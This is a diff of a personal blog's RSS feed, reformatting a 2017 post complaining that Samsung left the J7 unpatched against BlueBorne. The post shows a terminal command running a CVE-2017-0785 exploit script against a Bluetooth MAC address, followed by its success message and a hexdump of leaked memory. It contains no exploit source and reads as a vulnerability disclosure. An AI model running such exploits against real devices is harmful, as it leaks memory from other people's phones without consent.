@@ -1,12 +1,22 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Untitled RSS Feed]]></title><description><![CDATA[Untitled RSS Feed]]></description><link>https://e-yes.github.io</link><generator>RSS for Node</generator><lastBuildDate>Sun, 05 Nov 2017 10:11:04 GMT</lastBuildDate><atom:link href="https://e-yes.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA["Happy" to see that Samsung doesn't give a shit about BlueBorne.]]></title><description><![CDATA[<div class="paragraph">
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Untitled RSS Feed]]></title><description><![CDATA[Untitled RSS Feed]]></description><link>https://e-yes.github.io</link><generator>RSS for Node</generator><lastBuildDate>Sun, 05 Nov 2017 10:12:06 GMT</lastBuildDate><atom:link href="https://e-yes.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA["Happy" to see that Samsung doesn't give a shit about BlueBorne.]]></title><description><![CDATA[<div class="paragraph">
 <p>`
-─[$]› python CVE-2017-0785.py TARGET=28:27:BF:3A:17:8A
-[] Exploit: Done
-\x03\x00\x00\x00\x00\x00    \x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x04\x00\x00\x05\x00\x00\x06\x00\x00\x07\x00\x0\x00\x00    \x00
-00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
-*
-00000050  00 00 00 00  00 02 00 01  ea 3f 01 00  00 00 00 00  │····│····│·?··│····│
-00000060  00 00 75 30  00 00 00 08  f3 95 73 88  ce 93 12 b7  │··u0│····│··s·│····│
+─[$]› python CVE-2017-0785.py TARGET=28:27:BF:3A:17:8A</p>
+</div>
+<div class="paragraph">
+<p>[+] Exploit: Done</p>
+</div>
+<div class="paragraph">
+<p>\x03\x00\x00\x00+\x00\x00    \x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x04\x00\x00\x05\x00\x00\x06\x00\x00\x07\x00\x0\x00\x00    \x00</p>
+</div>
+<div class="paragraph">
+<p>00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+*</p>
+</div>
+<div class="paragraph">
+<p>00000050  00 00 00 00  00 02 00 01  ea 3f 01 00  00 00 00 00  │····│····│·?··│····│</p>
+</div>
+<div class="paragraph">
+<p>00000060  00 00 75 30  00 00 00 08  f3 95 73 88  ce 93 12 b7  │··u0│····│··s·│····│
 &#8230;&#8203;
 `</p>
 </div>]]></description><link>https://e-yes.github.io/2017/11/05/Happy-to-see-that-Samsung-doesnt-give-a-shit-about-Blue-Borne.html</link><guid isPermaLink="true">https://e-yes.github.io/2017/11/05/Happy-to-see-that-Samsung-doesnt-give-a-shit-about-Blue-Borne.html</guid><category><![CDATA[Samsung]]></category><category><![CDATA[J7]]></category><category><![CDATA[BlueBorne]]></category><dc:creator><![CDATA[Alexey Roslyakov]]></dc:creator><pubDate>Sun, 05 Nov 2017 00:00:00 GMT</pubDate></item><item><title><![CDATA[Let's get started]]></title><description><![CDATA[<div class="literalblock">
